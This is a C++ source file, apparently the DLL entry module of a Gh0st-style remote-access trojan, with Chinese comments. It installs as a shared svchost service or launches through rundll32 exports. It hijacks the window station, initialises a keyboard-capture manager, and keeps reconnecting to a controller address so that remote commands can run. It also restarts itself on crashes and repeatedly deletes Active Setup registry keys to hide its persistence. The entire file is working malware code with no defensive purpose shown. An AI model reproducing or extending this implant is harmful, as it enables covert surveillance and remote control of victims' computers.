﻿// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "common/KeyboardManager.h"
#include "common/KernelManager.h"
#include "common/login.h"
#include "common/install.h"
#include <stdio.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")


struct Connect_Address
{
	DWORD dwstact;
	char  strIP[MAX_PATH];
	int   nPort;
	char  ActiveXKeyGuid[MAX_PATH];	// 查找创建的Guid
}g_myAddress = { 0xCC28256,"",0,"" };


DWORD WINAPI DelAXRegThread(LPVOID lpParam);

char	svcname[MAX_PATH];
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;


char g_strSvchostName[MAX_PATH];//服务名
char g_strHost[MAX_PATH];
DWORD g_dwPort;
DWORD g_dwServiceType;

enum
{
	NOT_CONNECT, 			// 还没有连接
	GETLOGINFO_ERROR,		// 获取信息失败
	CONNECT_ERROR,			// 链接失败
	HEARTBEATTIMEOUT_ERROR 	// 心跳超时链接失败
};

DWORD WINAPI main(char *lpServiceName);
//处理异常
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// 发生异常，重新创建进程
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strSvchostName, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

DWORD WINAPI main(char *lpServiceName)
{
	strcpy(g_strHost, g_myAddress.strIP);
	g_dwPort = g_myAddress.nPort;
	// lpServiceName,在ServiceMain返回后就没有了
	char	strServiceName[256] = {0};
	char	strKillEvent[50] = { 0 };
	HANDLE	hInstallMutex = NULL;
	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
	HWINSTA hOldStation = GetProcessWindowStation();

	//---------------------------------------------------------------------------
	//char winsta0[] = { 0x07,0xbc,0xa3,0xa7,0xbb,0xb3,0xa7,0xf5};// winsta0
	//char* lpszWinSta = decodeStr(winsta0);						// 解密函数
	//
	//HWINSTA hWinSta = OpenWindowStation(lpszWinSta, FALSE, MAXIMUM_ALLOWED);
	//
	//memset(lpszWinSta, 0, winsta0[STR_CRY_LENGTH]);				// 填充0
	//delete lpszWinSta;											// 释放

	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	//---------------------------------------------------------------------------

	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////

	 // 这里判断CKeyboardManager::g_hInstance是否为空 如果不为空则开启错误处理
	 // 这里要在dllmain中为CKeyboardManager::g_hInstance赋值
	if (CKeyboardManager::g_hInstance != NULL)
	{
		//设置异常
		SetUnhandledExceptionFilter(bad_exception);

		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\CcRem %d", GetTickCount()); // 随机事件名
		//wsprintf(strKillEvent, "Global\\Net_%d", GetTickCount()); // 随机事件名

		hInstallMutex = CreateMutex(NULL, true, g_strHost);
		// ReConfigService(strServiceName); 
		// 删除安装文件
		// DeleteInstallFile(lpServiceName);  
	}
	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode(SEM_FAILCRITICALERRORS);
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char	*lpszProxyUser = NULL;
	char	*lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	//---这里声明了一个 CClientSocket类
	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接

	//这个循环里判断是否连接成功如果不成功则继续向下
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;

				}
				// 改一下
				Sleep(60);
			}
		}
		//上线地址
		lpszHost = g_strHost;
		dwPort = g_dwPort;

		if (lpszProxyHost != NULL)
			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
		else
			socketClient.setGlobalProxyOption();

		DWORD dwTickCount = GetTickCount();
		//---调用Connect函数向主控端发起连接
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;       //---连接错误跳出本次循环
			continue;
		}
		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		// 接成功后声明了一个CKernelManager 到CKernelManager
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		// socketClient中的主回调函数设置位这CKernelManager类中的OnReceive 
		//（每个功能类都有OnReceive函数来处理接受的数据他们都继承自父类CManager）
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接，获取是否有效标志
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();// 获取时间戳

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// 不需要恢复桌面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
		CKeyboardManager::Initialization();
		break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

int TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)
{
	SERVICE_STATUS srvStatus;
	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwCurrentState = g_dwCurrState = dwState;
	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode = dwExitCode;
	srvStatus.dwServiceSpecificExitCode = 0;
	srvStatus.dwCheckPoint = dwProgress;
	srvStatus.dwWaitHint = 1000;
	return SetServiceStatus(hServiceStatus, &srvStatus);
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
	// not really necessary because the service stops quickly
	switch (dwControl)
	{
	case SERVICE_CONTROL_STOP:
		TellSCM(SERVICE_STOP_PENDING, 0, 1);
		Sleep(10);
		TellSCM(SERVICE_STOPPED, 0, 0);
		break;
	case SERVICE_CONTROL_PAUSE:
		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
		TellSCM(SERVICE_PAUSED, 0, 0);
		break;
	case SERVICE_CONTROL_CONTINUE:
		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
		TellSCM(SERVICE_RUNNING, 0, 0);
		break;
	case SERVICE_CONTROL_INTERROGATE:
		TellSCM(g_dwCurrState, 0, 0);
		break;
	}
}


extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
{
	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
	wcstombs(svcname, argv[0], sizeof svcname);
	hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
	if (hServiceStatus == NULL)
	{
		return;
	}
	else FreeConsole();

	TellSCM(SERVICE_START_PENDING, 0, 1);
	TellSCM(SERVICE_RUNNING, 0, 0);
	// call Real Service function noew

	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	do {
		Sleep(100);//not quit until receive stop command, otherwise the service will stop
	} while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	if (g_dwServiceType == 0x120)
	{
		//Shared的服务 ServiceMain 不退出，不然一些系统上svchost进程也会退出
		while (1) Sleep(10000);
	}
	return;
}

extern "C" __declspec(dllexport) void TestFun(char* strHost, int nPort)
{
	strcpy(g_strHost, strHost);   // 保存上线地址
	g_dwPort = nPort;             // 保存上线端口
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
	//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}

void TestFuns(char* strHost, int nPort)
{
	strcpy(g_strHost, strHost);   // 保存上线地址
	g_dwPort = nPort;             // 保存上线端口
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
	//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}


extern "C" __declspec(dllexport) void MainRun(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
{
	MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DelAXRegThread, NULL, 0, NULL);
	char strHost[] = "127.0.0.1";          // 声明上线地址
	int  nPort = 8088;                     // 声明上线端口
	TestFuns(strHost, nPort);
}

extern "C" __declspec(dllexport) void FirstRun(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
{
	char strMyFileName[MAX_PATH], strCmdLine[MAX_PATH];
	ZeroMemory(strMyFileName, MAX_PATH);
	ZeroMemory(strCmdLine, MAX_PATH);
	//得到自身文件名
	GetModuleFileName(CKeyboardManager::g_hInstance, strMyFileName, MAX_PATH);
	//构造启动参数
	sprintf(strCmdLine, "%s %s,MainRun", "rundll32.exe", strMyFileName);

	//启动服务端
	STARTUPINFO StartInfo;
	PROCESS_INFORMATION ProcessInformation;
	StartInfo.cb = sizeof(STARTUPINFO);
	StartInfo.lpDesktop = NULL;
	StartInfo.lpReserved = NULL;
	StartInfo.lpTitle = NULL;
	StartInfo.dwFlags = STARTF_USESHOWWINDOW;
	StartInfo.cbReserved2 = 0;
	StartInfo.lpReserved2 = NULL;
	StartInfo.wShowWindow = SW_SHOWNORMAL;
	BOOL bReturn = CreateProcess(NULL, strCmdLine, NULL, NULL, FALSE, NULL, NULL, NULL, &StartInfo, &ProcessInformation);

}



DWORD WINAPI DelAXRegThread(LPVOID lpParam)
{
	char ActiveXStr[1024];             // activex 键值字符串
	char ActiveXStr32[1024];           // activex 键值字符串
	ZeroMemory(ActiveXStr, 1024);
	ZeroMemory(ActiveXStr32, 1024);

	if (g_myAddress.ActiveXKeyGuid != NULL)
	{
		//构造键值
		sprintf(ActiveXStr, "%s%s", "Software\\Microsoft\\Active Setup\\Installed Components\\", g_myAddress.ActiveXKeyGuid);
		sprintf(ActiveXStr32, "%s%s", "Software\\Wow6432Node\\Microsoft\\Active Setup\\Installed Components\\", g_myAddress.ActiveXKeyGuid);
		while (1)
		{
			//不停的删除注册表
			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr);
			OutputDebugString(ActiveXStr);      // 输出删除的字串用以测试
			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr32);
			OutputDebugString(ActiveXStr32);  
			Sleep(1000 * 30);
		}
	}
	return 0;

}

